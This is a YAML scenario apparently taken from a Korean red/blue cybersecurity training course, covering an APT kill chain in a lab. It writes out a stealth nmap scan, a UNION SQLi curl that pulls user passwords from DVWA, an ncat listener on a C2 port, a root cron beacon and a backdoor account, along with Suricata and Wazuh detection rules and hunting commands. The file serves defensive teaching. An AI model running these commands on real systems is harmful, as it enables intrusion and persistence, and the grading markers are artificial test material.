# contents/battle-scenarios/attack-adv-w01.yaml
id: "attack-adv-w01"
category: "attack-adv"
title: "[공격고급 W1] APT 킬체인 — 정찰→침투→발판→C2 전 단계 시뮬레이션"
difficulty: "hard"
time_limit: 3000
battle_type: "1v1"
description: |
  공격 고급과정 1주차 — **APT 킬체인**. 한 번의 익스플로잇이 아니라 정찰 → 침투 → 발판 → 지속성 → C2/유출로
  이어지는 **전 단계 캠페인**을 직접 수행한다. Red(공격) 학생은 킬체인을 실행하고, Blue(방어) 학생은 각 단계를
  탐지·재구성한다.

  ▸ 이야기
    공격자가 스텔스 정찰로 표면을 훑고, 태그 단 익스플로잇으로 침투하고, 리버스 셸 C2 와 cron 비콘으로 지속성을
    확보한다. 방어자는 각 단계를 탐지 룰로 잡고 ATT&CK 킬체인으로 재구성한다.

  ▸ 모드
    • solo : 한 학생이 공격(자기 인프라 표적)과 방어를 모두. 대상 = 본인 인프라.
    • duel : Red 가 상대(Blue) 인프라에 킬체인을 실행, Blue 는 자기 인프라에서 탐지.

  ▸ 공격자 위치(중요)
    이 주차의 Red 미션은 **망 외부 공격자 VM(192.168.0.202)** 기준이다. el34 는 공격자의 출처 IP를
    fw→ips→web(WAF) 전 계층에 그대로 보존하므로(HAProxy 제거·NAT 출처소실 없음), Red 채점은 **대상
    (el34) 인프라에 남은 탐지 흔적**(WAF audit / IPS / 호스트 계정·포트)과 **출처 IP(192.168.0.202)·
    고유 태그 상관**으로 한다. 반드시 **고유 태그**를 붙여 앰비언트 노이즈와 구분되게 한다.

  ▸ 이번 주차 전용 마커
    공격 태그 **`aa01r1-<본인id>`**, C2 포트 **55001**, cron 비콘 **`/etc/cron.d/aa01beacon`**(마커 `aa01`),
    계정 **`atka01`**, Suricata 탐지 **sid 9701011**, Wazuh 탐지 **id 103011**. 종료 시 cleanup.

red_missions:
  - order: 1
    assess_target: opponent
    target_vm: web
    points: 22
    instruction: |
      ## 🎯 RED-1 [정찰 → 침투] — 스텔스 정찰 후 태그 단 익스플로잇

      ### 상황
      킬체인 1·2단계다. 먼저 IDS 회피형 스텔스 정찰로 표면을 파악하고(개념: `nmap -sS -T2`, NSE `vuln`), 이어서
      대상 웹앱을 익스플로잇한다. 귀속을 위해 익스플로잇에 태그 `aa01r1-<본인id>` 를 단다.

      ### 할 일 (외부 공격자 VM 192.168.0.202)
      예시(id=kim):
      ```bash
      # 1) 스텔스 정찰 (느린 타이밍으로 IDS 회피 시도)
      nmap -sS -T2 -Pn -p 80,443 192.168.0.161          # (참고용 — 외부에서)
      # 2) 태그 단 침투 (UNION SQLi)
      curl -s -A "aa01r1-kim-apt" -H "Host: dvwa.6v6.lab" \
        "http://192.168.0.161/vulnerabilities/sqli/?id=aa01r1-kim%27%20UNION%20SELECT%20user,password%20FROM%20users--+&Submit=Submit"
      ```

      ### 채점 방법
      대상 WAF audit(modsec)에 태그 `aa01r1` 가 포함된 침투 탐지(913 스캐너/942 SQLi)가 남았는지로 채점.

      ### 합격 기준
      대상 WAF audit 에 `aa01r1` 태그가 포함된 침투 탐지가 남는다.
    hint: "스텔스 정찰(개념) + 태그(aa01r1) sqlmap UA + UNION SQLi → 대상 modsec audit. 채점: log_contains modsec aa01r1."
    verify:
      type: "log_contains"
      expect: "aa01r1"
      checks:
        - { id: "red-1-1", type: "log_contains", target: "web",
            params: { log: "modsec", pattern: "aa01r1", since_sec: 1800 } }
      semantic:
        intent: "APT 1·2단계 — Recon(T1595 스텔스 스캔)→Initial Access(T1190). 대상 WAF audit, 태그(aa01r1) 귀속."
        success_criteria:
          - "대상 WAF audit 에 aa01r1 태그 포함 침투 탐지"
          - "정찰 기법(스텔스 타이밍/NSE)과 침투 페이로드를 서술"
        acceptable_methods:
          - "외부 공격자 VM(192.168.0.202) 에서 스텔스 정찰 + 태그 익스플로잇"
        negative_signs:
          - "태그 누락 / 대상 미도달"

  - order: 2
    assess_target: opponent
    target_vm: web
    points: 18
    instruction: |
      ## 🎯 RED-2 [발판 → 지속성/C2] — 리버스 셸 + cron 비콘

      ### 상황
      킬체인 3·4단계다. 침투 후 리버스 셸 C2 채널(**포트 55001**)을 열고, cron 비콘(**`/etc/cron.d/aa01beacon`**)과
      백도어 계정(**`atka01`**)으로 지속성을 확보한다.

      ### 할 일
      ```bash
      nohup ncat -lk 55001 >/dev/null 2>&1 &     # C2 리스너 (또는 nc/python)
      echo '*/5 * * * * root /bin/bash -c "id # aa01 beacon" >/dev/null 2>&1' | sudo tee /etc/cron.d/aa01beacon
      sudo useradd -m -s /bin/bash atka01
      ```

      ### 채점 방법
      대상 호스트에 포트 55001 listening 이거나 `/etc/cron.d/aa01beacon`(마커 `aa01`)이 있는지로 채점.

      ### 합격 기준
      포트 55001 listening 또는 `/etc/cron.d/aa01beacon`(마커 `aa01`) 존재.
    hint: "C2 포트 55001 + cron 비콘 /etc/cron.d/aa01beacon (마커 aa01) + useradd atka01. 채점: port_listening 55001 + file_contains cron aa01."
    verify:
      type: "port_listening"
      expect: "55001"
      checks:
        - { id: "red-2-1", type: "port_listening", target: "web", params: { port: 55001 } }
        - { id: "red-2-2", type: "file_contains", target: "web",
            params: { path: "/etc/cron.d/aa01beacon", pattern: "aa01" } }
      semantic:
        intent: "APT 3·4단계 — C2(T1571) + Persistence(T1053.003 cron, T1136 계정). 리버스 셸 채널 + 비콘 + 백도어."
        success_criteria:
          - "포트 55001 listening 또는 cron 비콘(aa01)"
          - "C2/지속성 기법과 의도 서술"
        acceptable_methods:
          - "리스너 + cron.d + useradd"
        negative_signs:
          - "흔적 미생성 / 마커 누락"

blue_missions:
  - order: 1
    assess_target: self
    target_vm: ips
    points: 20
    instruction: |
      ## 🛡️ BLUE-1 [침투 단계 탐지] — Suricata 룰 (sid 9701011)

      ### 상황
      킬체인의 침투(웹공격) 단계를 잡는 Suricata 룰(**sid 9701011**)을 배포한다.

      ### 할 일
      ```
      alert http any any -> any any (msg:"ATKADV-W01 APT initial access SQLi"; flow:to_server; http.uri; content:"UNION"; nocase; content:"SELECT"; nocase; sid:9701011; rev:1;)
      ```
      ```bash
      sudo suricatasc -c reload-rules
      ```

      ### 채점 방법
      ips 의 `local.rules` 에 sid 9701011 룰이 있는지로 확인.

      ### 합격 기준
      `local.rules` 에 침투 단계를 보는 sid 9701011 룰이 존재한다.
    hint: "침투 단계 Suricata 룰(sid 9701011, UNION SELECT) → reload. 채점: file_contains local.rules 9701011."
    verify:
      type: "file_contains"
      expect: "9701011"
      checks:
        - { id: "blue-1-1", type: "file_contains", target: "ips",
            params: { path: "/etc/suricata/rules/local.rules", pattern: "9701011" } }
      semantic:
        intent: "APT 침투 탐지(네트워크) — Initial Access 단계 Suricata 룰. 킬체인 조기 가시화."
        success_criteria:
          - "local.rules 에 sid 9701011"
          - "어느 킬체인 단계를 탐지하는지 명시"
        acceptable_methods:
          - "Suricata 룰 작성 + reload"
        negative_signs:
          - "패턴 부정확 / 문법 오류"

  - order: 2
    assess_target: self
    target_vm: siem
    points: 22
    instruction: |
      ## 🛡️ BLUE-2 [지속성/C2 탐지] — Wazuh 룰 (id 103011)

      ### 상황
      RED-2 의 지속성(cron)·C2 단계를 잡는 Wazuh 룰(**id 103011**)을 배포한다.

      ### 할 일
      ```xml
      <group name="edu,apt,">
        <rule id="103011" level="13">
          <if_group>edu</if_group>
          <match>cron.d</match>
          <description>ATKADV-W01 - APT persistence (cron beacon) detected</description>
        </rule>
      </group>
      ```
      ```bash
      sudo /var/ossec/bin/wazuh-control restart
      ```
      (`/etc/cron.d/` 를 syscheck FIM 대상으로 두면 cron 비콘 설치가 잡힌다.)

      ### 채점 방법
      `local_rules.xml` 에 id 103011 룰이 있는지로 확인.

      ### 합격 기준
      `local_rules.xml` 에 지속성/C2 를 보는 id 103011 룰이 존재한다.
    hint: "지속성/C2 Wazuh 룰(id 103011, cron.d FIM) → restart. 채점: file_contains local_rules.xml 103011."
    verify:
      type: "file_contains"
      expect: "103011"
      checks:
        - { id: "blue-2-1", type: "file_contains", target: "siem",
            params: { path: "/var/ossec/etc/rules/local_rules.xml", pattern: "103011" } }
      semantic:
        intent: "APT 지속성/C2 탐지(호스트) — Persistence 단계 Wazuh FIM 룰. cron 비콘/계정 변조 포착."
        success_criteria:
          - "local_rules.xml 에 rule id 103011"
          - "cron/계정 지속성 탐지 로직 + FIM 대상 설명"
        acceptable_methods:
          - "Wazuh 룰 작성 + restart"
        negative_signs:
          - "탐지 로직 부실 / XML 오류"

  - order: 3
    assess_target: self
    target_vm: siem
    points: 18
    instruction: |
      ## 🛡️ BLUE-3 [킬체인 재구성] — ATT&CK 매핑 + 헌팅

      ### 상황
      흩어진 탐지를 **하나의 APT 캠페인**으로 재구성한다. 각 경보를 ATT&CK 킬체인 단계(Recon→Initial Access→
      Execution→Persistence→C2)로 매핑하고, 호스트에서 발판(포트 55001/cron/계정 atka01)을 헌팅한다.

      ### 할 일
      보고서에:
      - ATT&CK 킬체인 단계별 매핑(이번 룰 9701011/103011 포함)
      - 헌팅 결과: `ss -tlnp | grep 55001`, `cat /etc/cron.d/aa01beacon`, `getent passwd | grep atka01`
      ```bash
      sudo tail -200 /var/ossec/logs/alerts/alerts.json | \
        python3 -c 'import sys,json;[print(json.loads(l).get("rule",{}).get("id")) for l in sys.stdin if l.strip()]' | sort | uniq -c | sort -rn | head
      ```

      ### 채점 방법
      본인 SIEM 에 최근 경보가 수집돼 있는지 + 제출한 킬체인 재구성/헌팅으로 채점.
      > 참고: 실재 증거(Suricata IDS rule **86601** 등)를 인용하면 점수가 오른다.

      ### 합격 기준
      본인 SIEM 에 최근 경보가 있다(+ ATT&CK 킬체인 재구성·헌팅은 제출로 검증).
    hint: "ATT&CK 킬체인 단계 매핑(9701011/103011 포함) + 발판(55001/cron/atka01) 헌팅. 실증 증거(86601) 인용. 채점: wazuh_alert + 제출."
    verify:
      type: "wazuh_alert"
      expect: "alert"
      checks:
        - { id: "blue-3-1", type: "wazuh_alert", target: "siem", params: { since_sec: 1800 } }
      semantic:
        intent: "APT 킬체인 재구성 — 경보를 단계별로 매핑 + 발판 헌팅. 분석형 — 실재 증거 인용 시 점수 상승."
        success_criteria:
          - "최근 경보 수집 확인"
          - "ATT&CK 킬체인 단계별 매핑(이번 룰 반영)"
          - "발판(포트/cron/계정) 헌팅 결과"
        acceptable_methods:
          - "ATT&CK 매핑 + 헌팅"
        negative_signs:
          - "단계 매핑 누락 / 헌팅 없음"
